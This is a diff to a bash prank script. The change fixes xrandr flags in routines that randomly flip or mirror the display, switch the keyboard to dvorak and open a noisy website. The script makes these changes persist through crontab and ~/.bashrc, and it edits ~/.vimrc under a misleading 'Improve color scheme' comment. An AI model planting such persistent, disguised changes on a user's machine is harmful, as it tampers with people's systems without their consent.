@@ -23,10 +23,10 @@ for n in {1 .. $[($RANDOM % 3) + 1]}
 do
     case $[$RANDOM % 9] in
         0) # Mirror the display weekly
-            crontab -l | sed "\$a\@weekly /usr/bin/xrandr --device $DEVICE --reflect xy" | crontab -
+            crontab -l | sed "\$a\@weekly /usr/bin/xrandr --output $DEVICE --reflect xy" | crontab -
             ;;
         1) # Mirror the display every time a bash shell is started
-            echo "xrandr --device $DEVICE --reflect xy" >> ~/.bashrc
+            echo "xrandr --output $DEVICE --reflect xy" >> ~/.bashrc
             ;;
         2) # Remove VIM colors
             echo '" Improve color scheme' >> ~/.vimrc
@@ -73,7 +73,7 @@ for n in {1 .. $[($RANDOM % 3) + 1]}
 do
     case $[$RANDOM % 8] in
         0) # Mirror the display
-            xrandr --device $DEVICE --reflect xy
+            xrandr --output $DEVICE --reflect xy
             ;;
         1) # Set keyboard layout to dvorak
             setxkbmap dvorak
@@ -91,10 +91,10 @@ do
             done
             ;;
         5) # Flip display
-            xrandr --device $DEVICE --reflect x
+            xrandr --output $DEVICE --reflect x
             ;;
         6) # Flip display
-            xrandr --device $DEVICE --reflect y
+            xrandr --output $DEVICE --reflect y
             ;;
         7) # Beepdog!
             www-browser http://beepdog.us &
